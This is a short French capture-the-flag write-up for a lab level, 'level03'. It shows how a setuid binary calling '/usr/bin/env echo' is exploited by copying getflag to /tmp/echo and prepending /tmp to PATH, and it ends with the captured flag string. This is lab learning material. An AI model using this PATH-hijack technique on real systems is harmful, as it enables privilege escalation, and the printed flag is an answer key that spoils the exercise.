On nous propose un binaire à exploité run:‘exploit me’

Avec ls -la on voit que level03 à les permissions de flag03

Pas de possibilité d’entrer d’arguments. 
On cherche comment ‘Exploit me’ est appelé. 

En cherchant comment analyser des fichiers binaires,
on peut trouver le vidage hexagonal.
hexdump -C level03.c
En ascii on trouve la ligne qui print ‘exploit me’ 

Pour plus de facilité(ou pas) on peut copier le binaire sur 42vm pour utiliser vim 
hexdump -C level03 > hexalevel03
Puis vim :?Exploit

On trouve la ligne d’intérêt /usr/bin/env echo Exploit me

cette utilisation présente une faille décrite ci-dessous:
As /usr/bin/env searches for the specified binary in the PATH variable, we can just fake the "echo" binary with our own binary to get a shell.

D’ailleurs on retrouve bien ‘getflag’ dans /bin/ on peut faire passé getflag pour echo grace au PATH
ls /bin/ | grep flag

D’abord, il faut pouvoir modifier le nom de getflag par echo et le sortir de bin. 
J’utilise encore le dossier /tmp/ 
	cp /bin/getflag /tmp/echo
Ensuite, on modifie PATH pour que le binaire aille cherche notre echo dans /tmp/
	export PATH=/tmp:$PATH
printenv PATH
On à plus qu’a run ./level03 pour avoir le flag
flag: qi0maab88jeaj46qoumi7maus
